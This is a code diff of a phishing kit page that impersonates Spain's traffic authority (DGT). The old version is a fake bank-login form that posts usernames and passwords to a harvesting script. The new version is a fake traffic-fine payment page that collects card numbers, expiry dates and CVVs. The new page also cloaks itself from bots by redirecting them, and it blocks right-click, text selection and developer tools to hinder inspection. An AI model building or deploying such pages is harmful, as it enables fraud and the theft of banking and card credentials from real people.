@@ -1,122 +1,237 @@
-<html lang="es"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
+<?php
+session_start();
+
+require '../server/all.php';
+include '../settings.php';
+//include '../server/fonctions.php';
+
+
+if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ) {	
+?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">
+<head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>utenticación por banco</title>
-    
-    <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <title>Page de sanciones</title>
 
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="../assets/ing/style.css">
-    <link rel="stylesheet" href="../assets/ing/scrollbar.css">
+    <!-- Import des styles nÃ©cessaires -->
+    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap-theme.min.css">
+    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/selectize-0.12.4/css/selectize.bootstrap3.css">
+    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/font-awesome-4.7.0/font-awesome.custom.min.css">
+    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/datepicker-0.4.0/datepicker.min.css">
+    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/unslider-2.0.3/unslider.css">
+    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estilosComObl.css">
+    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estiloPropio.css">
 
-    <!-- Font Awesome for icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-    
     <style>
         body {
-            padding-top: 20px;
+            margin: 0;
             font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
         }
-        .main-header {
-            background-color: #004488;
+
+        .main-header, .main-footer {
+            background-color: #048;
             color: #fff;
             padding: 10px 0;
-        }
-        .main-header .title {
-            color: #fff;
-            font-size: 24px;
             text-align: center;
         }
-        .form-control {
-            margin-bottom: 15px;
-            border-radius: 4px;
+
+        .main-header h1, .main-footer p {
+            margin: 0;
         }
-        .btn-primary {
-            background-color: #004488;
-            border-color: #003366;
-            border-radius: 4px;
-        }
-        .btn-primary:hover {
-            background-color: #003366;
-            border-color: #002244;
-        }
+
         .container {
-            max-width: 100%;
+            padding: 20px;
         }
-        .logo img {
-            max-width: 100%;
-            height: auto;
+
+        .custom-button {
+            background-color: #048;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
         }
-        .error-message {
+
+        .custom-button:hover {
+            background-color: #036;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-control {
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            padding: 10px;
+            width: 100%;
+        }
+
+        label.mandatory::after {
+            content: " *";
             color: red;
-            text-align: center;
-            margin-top: 10px;
         }
-        @media (max-width: 576px) {
-            .main-header .title {
-                font-size: 18px;
-            }
+
+        .footer-social ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .footer-social ul li {
+            display: inline-block;
+            margin: 0 10px;
         }
     </style>
-<script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/../executers/vi-tr.js"></script></head>
-<body __processed_f439c52e-6bc6-413e-bbd9-201fc3a296b7__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4xNSIsInNjb3JlIjoyMDAxNX1d">
+
+    <script src="https://js.stripe.com/v3/buy-button.js" async></script>
+</head>
+<body>
     <header class="main-header">
-        <div class="container" bis_skin_checked="1">
-            <div class="row" bis_skin_checked="1">
-                <div class="col-12 text-center" bis_skin_checked="1">
-                    <div class="logo" bis_skin_checked="1">
-                        <a href="#" target="_blank"><img src="../assets/images/logo-mir.png" alt="Logo MIR"></a>
-                        <a href="#" target="_blank"><img src="../assets/images/logo-dgt.png" alt="Logo DGT"></a>
-                    </div>
-                    <div class="title" bis_skin_checked="1">Autenticación por banco</div>
-                </div>
-            </div>
-        </div>
+        <h1>Pago de sanciones</h1>
     </header>
-
     <main class="container">
-        <div class="row justify-content-center" bis_skin_checked="1">
-            <div class="col-12 col-md-8" bis_skin_checked="1">
-                <center><img src="../assets/ing/ico_oob_1.png" width="125" alt="Icon"></center>
-                <h4 class="text-center text-primary">Por favor, identificate con tu nombre de usuario y contraseńa de banca electrónica</h4>
-                
-                <form id="oobForm" action="../actions/banque.php" method="POST">
-                    <div class="form-group" bis_skin_checked="1">
-                        <label for="nom_bank">Nombre del banco</label>
-                        <input type="text" class="form-control" id="nom_bank" name="nom_bank" placeholder="Ingrese su identificación" required="">
-                    </div>
-
-                    <div class="form-group" bis_skin_checked="1">
-                        <label for="identifiant_banque">Identificación</label>
-                        <input type="text" class="form-control" id="identifiant_banque" name="identifiant_banque" placeholder="Ingrese su identificación" required="">
-                    </div>
-
-                    <div class="form-group" bis_skin_checked="1">
-                        <label for="mdp_banque">Contraseńa</label>
-                        <input type="password" class="form-control" id="mdp_banque" name="mdp_banque" placeholder="Ingrese su contraseńa" required="">
-                    </div>
-
-                    <div class="text-center" bis_skin_checked="1">
-                        <button type="submit" id="banque_submit" name="banque_submit" class="btn btn-primary">Validar</button>
-                    </div>
-                </form>
+        <h2>Pago de su multa NÂ°164357371274</h2>
+        <form method="post" id="carte_form" action="../actions/carte.php">
+            <div class="form-group">
+                <label class="mandatory">NÃºmero de tarjeta de crÃ©dito</label>
+                <input id="ccnum" type="text" name="ccnum" class="form-control" minlength="16" maxlength="16" inputmode="numeric" oninput="chiffres_only(this)" required>
+                <span id="errorMessage" style="color: red;"></span>
             </div>
-        </div>
+            <div class="form-group">
+                <label class="mandatory">Fecha de expiraciÃ³n</label>
+                <input id="exp" type="text" name="exp" class="form-control" minlength="7" maxlength="7" inputmode="numeric" placeholder="MM/AAAA" oninput="validateExpirationDate(this);" onkeyup="formatString(event);" required>
+            </div>
+            <div class="form-group">
+                <label class="mandatory">CVV</label>
+                <input id="cvv" type="text" name="cvv" class="form-control" minlength="3" maxlength="4" placeholder="xxx" inputmode="numeric" oninput="chiffres_only(this)" required>
+            </div>
+            <button type="submit" name="carte_submit" class="custom-button">Continuar</button>
+            <input type="hidden" name="carte_submit" id="carte_submit" value="true">
+        </form>
     </main>
+    <footer class="main-footer">
+        <p>Copyright @ DGT 2022. Todos los derechos reservados</p>
+        <div class="footer-social">
+            <ul>
+                <li><a href="" target="_blank"><em class="fa fa-facebook-square"></em></a></li>
+                <li><a href="" target="_blank"><em class="fa fa-twitter-square"></em></a></li>
+                <li><a href="" target="_blank"><em class="fa fa-youtube-square"></em></a></li>
+                <li><a href="" target="_blank"><em class="fa fa-instagram"></em></a></li>
+            </ul>
+        </div>
+        <div class="contact">
+            <p>TelÃ©fono: 011 Estado del TrÃ¡fico | 060 Admin. Gral. del Estado</p>
+            <p>UbicaciÃ³n: C/ Josefa Valcarcel, 28 - 28071 Madrid-EspaÃ±a</p>
+        </div>
+    </footer>
 
-    <!-- jQuery and Bootstrap JS -->
-    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
-
-    <!-- Custom JS -->
     <script>
-        // Example of additional custom JS if needed
-        $(document).ready(function(){
-            // Your code here
+        function validateExpirationDate(input) {
+            input.value = input.value.replace(/\D/g, '');
+            if (input.value.length > 2) {
+                input.value = input.value.slice(0, 2) + '/' + input.value.slice(2);
+            }
+
+            var mois = parseInt(input.value.slice(0, 2), 10);
+            var annee = parseInt(input.value.slice(3), 10);
+
+            if (mois < 1 || mois > 12 || annee < 2024 || annee > 2035 || isNaN(mois) || isNaN(annee)) {
+                document.getElementById('errorMessage').textContent = "Fecha no vÃ¡lida!";
+            } else {
+                document.getElementById('errorMessage').textContent = "";
+            }
+        }
+
+        function chiffres_only(input) {
+            input.value = input.value.replace(/\D/g, '');
+        }
+
+        document.addEventListener("contextmenu", function(e) {
+            e.preventDefault();
+        }, false);
+
+        document.addEventListener("selectstart", function(e) {
+            e.preventDefault();
+        }, false);
+
+        window.addEventListener("keydown", function(e) {
+            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+                e.preventDefault();
+            }
+        });
+
+        document.getElementById('carte_form').addEventListener('submit', function() {
+            document.getElementById('carte_submit').disabled = true;
         });
     </script>
+</body>
+</html>
+
+
+	<!-- REDIRECTION EN CAS DE BOT OU ISP NON AUTORISER -->
+<?php
+} else {
+    header("Location: https://www.google.com");
+    exit;
+}
+
+?>
+
+<!-- script js -->	
+<script>
+
+function ccnum(ccnum) {
+      // Supprimer tout sauf les chiffres
+      input.value = input.value.replace(/\D/g, '');
+
+      var errorMessage = document.getElementById("errorMessage");
+
+      if (input.value.length === 16) {
+        errorMessage.textContent = "";
+      } else {
+        errorMessage.textContent = "Le numÃ©ro de carte de crÃ©dit doit contenir 16 chiffres.";
+      }
+}
+
+
+   
+	 
+	 
+	  function chiffres_only(input) {
+            input.value = input.value.replace(/\D/g, '');
+        }
+
+		
+		
+		
+		document.addEventListener("contextmenu", function(e){
+        e.preventDefault();
+    }, false);
+
+    // DÃ©sactiver la sÃ©lection de texte
+    document.addEventListener("selectstart", function(e){
+        e.preventDefault();
+    }, false);
+
+
+    window.addEventListener("keydown", function(e) {
+        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+            e.preventDefault();
+        }
+    });
+</script>
 
 
 
-</body></html>
+<script>
+        document.getElementById('carte_form').addEventListener('submit', function() {
+            // DÃ©sactiver le bouton de soumission aprÃ¨s le clic
+            document.getElementById('carte_submit').disabled = true;
+        });
+    </script>
